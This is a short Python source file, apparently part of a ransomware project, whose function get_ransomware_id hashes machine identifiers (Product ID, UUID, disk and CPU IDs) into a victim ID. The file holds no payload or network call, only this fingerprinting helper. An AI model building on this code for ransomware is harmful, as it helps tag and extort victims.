import hashlib
from fingerprint import *

def get_ransomware_id():
    values = get_fingerprint();

    # taking only params that are considered to be unique
    ransomware_id_string = values["Product ID"] + values["UUID"] + values["hdd_id"] + values["cpu_id"]

    hash_object = hashlib.sha256(ransomware_id_string.encode('ascii'));
    ransomware_id = hash_object.hexdigest();
    return ransomware_id;



